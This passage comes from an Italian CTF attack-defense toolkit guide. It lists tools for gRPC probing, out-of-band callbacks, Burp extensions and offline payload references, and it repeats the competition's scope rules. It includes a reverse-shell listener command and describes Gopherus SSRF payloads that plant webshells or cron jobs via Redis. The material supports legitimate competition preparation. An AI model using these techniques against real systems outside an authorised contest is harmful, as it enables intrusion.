  server espone la *reflection*, ti fai dare la lista dei metodi; altrimenti gli passi i `.proto`.
- **In pratica (nel tuo caso)**: interroghi i tuoi servizi gRPC Python a mano, poche richieste
  (quindi ok anche sugli avversari). Se serve logica/crypto complessa, passa a protoc (sotto).
- **Install**: `GOBIN=~/arsenal/bin go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest`
- **Uso (con reflection)**: `grpcurl -plaintext svc:50051 list` → `grpcurl -plaintext -d '{"id":1}' svc:50051 pkg.Service/Method`
- **Uso (senza reflection, coi .proto dei sorgenti)**: `grpcurl -plaintext -import-path ./proto -proto app.proto -d '{}' svc:50051 pkg.Service/Method`
- **Note**: `-plaintext` = senza TLS (h2c); `describe` mostra lo schema di un messaggio.

### grpcui — `github.com/fullstorydev/grpcui`  [LEAN-OK]
- **Cosa fa**: la stessa cosa di grpcurl ma con una **paginetta web** da cliccare, comoda per i
  messaggi complessi con tanti campi.
- **In pratica**: quando compilare il JSON a mano è scomodo, apri grpcui e riempi i campi nel browser.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/fullstorydev/grpcui/cmd/grpcui@latest`
- **Uso**: `grpcui -plaintext svc:50051`
- **Note**: stessa logica di import `.proto` di grpcurl.

### protoc + grpcio-tools — client su misura  [OFFLINE→LEAN-OK]
- **Cosa fa**: **compila i `.proto` in codice Python**, così ti scrivi un **client tuo** quando il
  metodo richiede logica particolare (es. cifrare qualcosa con `pycryptodome` prima di inviarlo).
- **In pratica**: riusi direttamente i `.proto` e magari le **chiavi** dai sorgenti del servizio e
  costruisci l'esatta chiamata che estrae la flag.
- **Install**: `apt install protobuf-compiler && pip install grpcio grpcio-tools`
- **Uso**: `python -m grpc_tools.protoc -I./proto --python_out=. --grpc_python_out=. app.proto`
- **Note**: —

---

## 8) OOB / CALLBACK SELF-HOSTED

> "OOB" (out-of-band) serve agli attacchi **alla cieca**: non vedi la risposta, ma metti in piedi
> un tuo server e controlli **se il bersaglio ti contatta**. Se ti arriva la chiamata → l'attacco
> ha funzionato. **Realismo LAN**: per DNS-exfil serviresti un dominio pubblico; per un semplice
> callback HTTP/TCP sulla rete di gara basta il **tuo IP + un ascoltatore**.

### interactsh (self-host) — `github.com/projectdiscovery/interactsh`  [LEAN-OK]  ⭐ (VIVO)
- **Cosa fa**: un **tuo server che "ascolta"** su tanti protocolli (DNS/HTTP/SMTP/LDAP) e registra
  ogni volta che qualcuno lo contatta. È l'equivalente open-source del "Burp Collaborator".
- **In pratica (nel tuo caso)**: per blind SSRF/XXE/RCE dai al bersaglio un URL/hostname del tuo
  interactsh e guardi se arriva la chiamata.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest && GOBIN=~/arsenal/bin go install github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest` + `docker pull projectdiscovery/interactsh-client`
- **Uso (server su VPS)**: `interactsh-server -domain tuodominio.tld -ip <IP_PUB> -sa` → poi `interactsh-client -s https://tuodominio.tld`
- **Note**: le regole **consentono** interazioni con server remoti/cloud, quindi un interactsh su
  VPS è **lecito**; il dubbio è **tecnico** (il container avversario ha egress verso Internet?) →
  **apri ticket**. DNS-exfil richiede di controllare il resolver del target: quasi mai. `[NET-RUN]`
  per la parte pubblica; prepara dominio+DNS **giorni prima**.

### Fallback LAN — ascoltatori "poveri" (offline, zero setup)  [LEAN-OK]
- **Cosa fa**: invece di interactsh, apri un **semplice server sul tuo PC** e guardi i log. Copre
  il 90% dei blind in cui basta un callback **HTTP o TCP**.
- **In pratica**: dai al target `http://<TUO_IP_LAN>:8000/PING123` (SSRF/XXE) o un IP:porta per una
  reverse shell, e osservi la connessione arrivare.
  - **HTTP**: `python3 -m http.server 8000 --bind <TUO_IP_LAN>`
  - **TCP grezzo / reverse shell**: `ncat -lvnkp 9001` (o `nc -lvnp 9001`)
- **Note**: per DNS-exfil servirebbe controllare il resolver del target → in CTF quasi mai; punta
  su HTTP/TCP.

### ⚠️ Niente Responder / poisoning — fuori scope
- **Perché**: **Responder** (e simili) fa **poisoning attivo** (LLMNR/NBT-NS/mDNS) sulla rete
  condivisa → colpisce **altri team/infrastruttura** = **fuori scope e vietato**.
- **Cosa usare invece**: **solo listener passivi** (i due sopra), che si limitano a **ricevere** la
  callback generata dal TUO exploit.

### Gopherus — `github.com/tarunkant/Gopherus`  [OFFLINE per generare]  (SSRF → servizi interni)
- **Cosa fa**: **costruisce URL speciali `gopher://`** che, sfruttando una SSRF (il server fa una
  richiesta per conto tuo), riescono a "parlare" con **servizi interni** come Redis, MySQL,
  Postgres o FastCGI e a farli eseguire comandi.
- **In pratica (nel tuo caso)**: se un tuo servizio (Express/SvelteKit) ha una SSRF e dietro c'è un
  Redis/DB interno, generi il payload gopher **in locale** e lo incolli nel parametro vulnerabile.
  Es. Redis → scrivi una webshell/cron; FastCGI → RCE PHP.
- **Install**: `git clone https://github.com/tarunkant/Gopherus ~/arsenal/oob/Gopherus`
- **Uso**: `python2 ~/arsenal/oob/Gopherus/gopherus.py --exploit redis`
- **Note**: originale in **Python2** → usalo con `python2` o un fork py3. Generare il payload è
  offline; l'invio è 1 richiesta.

---

## 9) PROXY + ESTENSIONI

### Burp Suite Community — `portswigger.net/burp/communitydownload`  [LEAN-OK]  ⭐
- **Cosa fa**: il programma che si **mette in mezzo** tra te e il sito. Ogni richiesta che parte dal
  browser passa da Burp: la **intercetti**, la **modifichi**, la **rimandi** (Repeater) e confronti
  le risposte. È il tuo **banco di lavoro** principale.
- **In pratica**: qui costruisci e affini l'exploit sulla **singola richiesta**. ⚠️ usa Repeater
  (mirato); evita l'Intruder "di massa" puntato sugli avversari (troppo traffico).
- **Install**: scarica l'installer/jar da PortSwigger (già presente su Kali). Non c'è via `apt`.
- **Note**: la Community basta; per fuzz veloci usa **Turbo Intruder** (sotto).

### Caido — `github.com/caido/caido` · `caido.io`  [LEAN-OK]
- **Cosa fa**: un'**alternativa moderna a Burp** (scritta in Rust), interfaccia più reattiva, stesse
  idee (proxy + replay).
- **In pratica**: piano B se Burp ti sta stretto o pesa.
- **Install**: binario dai Releases GitHub / caido.io.
- **Note**: —

### Estensioni Burp che contano (BApp Store — **scaricale online a casa**)  [LEAN-OK]
- **JWT Editor** (`github.com/portswigger/jwt-editor`): **decodifica e ri-firma i JWT** dentro
  Repeater e lancia gli attacchi (none, confusione HMAC, JWK embedded, jku). Coppia con jwt_tool.
- **SignSaboteur**: attacca **token firmati** (JWT e non) direttamente da Burp, in automatico.
- **Turbo Intruder** (`github.com/PortSwigger/turbo-intruder`): **invia richieste a raffica** ad
  altissima velocità (aggira il limite dell'Intruder Community); serve per le **race condition**
  (attacco "single-packet"). ⚠️ solo dove il volume è lecito.
- **Param Miner** (`github.com/PortSwigger/param-miner`): **scopre parametri/header nascosti** e
  aiuta col cache poisoning.
- **Autorize** (`github.com/Quitten/Autorize`): **testa gli IDOR/permessi in automatico**: ripete le
  tue richieste con una sessione a **privilegio più basso** e ti dice se passano lo stesso. Enorme
  quando ci sono più utenti/ruoli.
- **Auth Analyzer** (`github.com/simioni87/auth_analyzer`): come Autorize, spesso più comodo.
- **Hackvertor** (`github.com/hackvertor/hackvertor`): **converte/codifica pezzi di richiesta** al
  volo (base64, hex, hmac, cambi di charset) — utile per i bypass.
- **Logger++** (`github.com/nccgroup/LoggerPlusPlus`): **registra e permette di cercare** in tutto
  il traffico passato, con filtri avanzati.
- **Note runtime**: le estensioni **Python** (Autorize…) richiedono il **jar Jython standalone**;
  quelle **Ruby** il **JRuby**. Scaricali e configurali in *Extensions → Options* **a casa**,
  altrimenti in gara non partono.

---

## 10) KNOWLEDGE BASE OFFLINE

### PayloadsAllTheThings — `github.com/swisskyrepo/PayloadsAllTheThings`  [OFFLINE]  ⭐
- **Cosa fa**: una **raccolta enorme di payload pronti e trucchi** per ogni tipo di vulnerabilità
  (SQLi, SSTI, XXE, upload, deserializzazione, NoSQL, SSRF…), in file di testo → si consulta offline.
- **In pratica**: la tua **bibbia** in gara: apri la sezione della vulnerabilità che hai trovato e
  copi/adatti il payload. Cerca con ripgrep dentro la cartella.
- **Install**: `git clone https://github.com/swisskyrepo/PayloadsAllTheThings ~/arsenal/kb/PayloadsAllTheThings`
- **Uso**: `rg -n "filter\('system'\)" ~/arsenal/kb/PayloadsAllTheThings`
- **Note**: —

### HackTricks (offline) — `github.com/HackTricks-wiki/hacktricks`  [OFFLINE]  (spostato!)
- **Cosa fa**: un **wiki** che spiega **passo-passo** come attaccare ogni cosa (Twig/Symfony, JWT,
  XXE, SSRF, priv-esc…). Più "guida ragionata" rispetto ai payload secchi di PaTT.
- **In pratica**: quando sai *cosa* hai davanti ma non *come* sfruttarlo, cerchi qui la metodologia.
- **Install**: `git clone https://github.com/HackTricks-wiki/hacktricks ~/arsenal/kb/hacktricks && docker pull ghcr.io/hacktricks-wiki/hacktricks-cloud/translator-image`
- **Uso (render locale)**: `docker run -d --rm -p 3337:3000 -v ~/arsenal/kb/hacktricks:/app ghcr.io/hacktricks-wiki/hacktricks-cloud/translator-image bash -c "cd /app && MDBOOK_PREPROCESSOR__HACKTRICKS__ENV=dev mdbook serve --hostname 0.0.0.0"` → http://localhost:3337 (build ~5 min, **falla a casa**)
- **Note offline pura**: se non vuoi Docker, è tutto **markdown** in `hacktricks/src/` → `rg -n "twig" ~/arsenal/kb/hacktricks/src`.

### SecLists — `github.com/danielmiessler/SecLists`  [OFFLINE]  ⭐
- **Cosa fa**: **raccolte di "parole" (liste)** per i fuzzer e per il cracking: nomi di cartelle e
  parametri, password comuni (rockyou), ecc.
- **In pratica**: è il "carburante" di ffuf/feroxbuster/x8 (in locale) e di hashcat/jwt_tool per
  craccare i segreti offline.
- **Install**: `git clone --depth 1 https://github.com/danielmiessler/SecLists ~/arsenal/wordlists/SecLists` (grande → `--depth 1`)
- **Note**: contiene `rockyou.txt` per il cracking JWT/HS.

### GTFOBins — `github.com/GTFOBins/GTFOBins.github.io`  [OFFLINE]
- **Cosa fa**: un **elenco di comandi Linux "normali"** (binari SUID, voci di `sudo`) che possono
  essere **piegati** per leggere file o alzare i privilegi, una volta che hai una shell.
- **In pratica**: quando dentro un container hai una shell limitata e devi leggere il file della
  flag (magari di un altro utente), qui trovi il trucco col binario disponibile.
- **Install**: `git clone https://github.com/GTFOBins/GTFOBins.github.io ~/arsenal/kb/GTFOBins`
- **Uso**: `rg -n "sudo" ~/arsenal/kb/GTFOBins/_gtfobins`
- **Note**: ⚠️ resta **dentro il container** (no escape verso la VM host).

### CyberChef (offline) — `github.com/gchq/CyberChef`  [OFFLINE]
- **Cosa fa**: un **coltellino svizzero per i dati**: converte/decodifica al volo (base64, hex,
  URL, hash, decodifica JWT, XOR…) trascinando l'input, tutto **dentro il browser**.
- **In pratica**: quando devi capire/trasformare un token, un blob codificato, un hash — senza
  scrivere script. 100% offline.
- **Install**: scarica lo **ZIP release** dai Releases → estrai `CyberChef_vX.html` (un solo file) e
  aprilo nel browser.
- **Uso**: apri il file HTML in locale, incolla l'input, componi le "ricette".
- **Note**: nessun server, gira dal file.

### jq — `apt install jq`  [OFFLINE]
- **Cosa fa**: uno strumento da terminale per **leggere e manipolare JSON** in modo pulito.
- **In pratica**: per estrarre campi dalle risposte JSON dei servizi/dell'API flag_id, o per
  costruire/modificare payload JSON al volo negli script.
- **Uso**: `curl -s http://10.10.0.1:8081/flagIds | jq '.'`
- **Note**: —

### PEASS-ng / linpeas — `github.com/peass-ng/PEASS-ng`  [in-container]
- **Cosa fa**: uno **script che, una volta dentro** un sistema, **elenca automaticamente** le
  possibili vie di privilege escalation (permessi, config deboli, file interessanti).
- **In pratica**: ⚠️ solo **dentro il container** per arrivare al file-flag; **vietato uscire dal
  container / attaccare la VM host** e vietato installare backdoor. Spesso con l'RCE la flag è già
  lì (flagstore) e linpeas è superfluo.
- **Install**: `git clone https://github.com/peass-ng/PEASS-ng ~/arsenal/kb/PEASS-ng`
- **Note**: usalo con parsimonia e mai per pivotare fuori scope.

---

## APPENDICE — mappatura stack → tool

| Stack servizio | Tool primari |
|---|---|
| Flask + Jinja2 (MySQL/PG/SQLAlchemy) | SSTImap, sqlmap/ghauri, semgrep(p/flask), jwt_tool |
| Node/Express (pg, sequelize, ejs, multer, tar, sharp, jwt) | sqlmap/ghauri, SSTImap(EJS)+PaTT, evilarc/slipit (tar-slip), jwt_tool/JWT Editor, jsluice, commix |
| SvelteKit + MySQL + libxmljs (XXE) + jwt | XXEinjector/XXExploiter, sqlmap, jwt_tool, interactsh/listener LAN |
| PHP + Twig | phpggc + symfony-exploits, SSTImap(twig), sqlmap |
| gRPC (Python, pycryptodome) | grpcurl/grpcui, protoc+grpcio-tools, fickling (se pickle) |
| JWT ovunque | jwt_tool, JWT Editor/SignSaboteur, hashcat -m 16500 |

---

## APPENDICE — cosa TESTARE/AVVIARE prima (con internet, a casa)
1. `interactsh-server` su VPS + DNS (giorni prima) **oppure** accetta il fallback listener LAN.
2. `nuclei -update-templates` (a casa).
3. Build HackTricks (`docker pull` + `mdbook serve` una volta).
4. Estensioni Burp: scaricale dal BApp Store + configura i jar **Jython/JRuby**.
5. `docker pull` immagini (jwt_tool, interactsh, hacktricks).
6. `semgrep --config auto` una volta per cachare le regole; poi usa regole locali.
7. Verifica i runtime installati: `go`, `python3`+venv, `ruby`, `php-cli`, `node/npm`, `cargo`, `docker`, `protoc`.
8. (Consigliato) `pip download -d ~/arsenal/wheelhouse` dei tool pip per reinstallo offline.
9. `~/arsenal/bin` in `PATH` (aggiungi al `.bashrc`).
10. **Prova sul tuo box + NOP box** un exploit-tipo end-to-end (leggi flag reale) prima della gara,
    così il flusso "locale → NOP → farm" è già rodato.
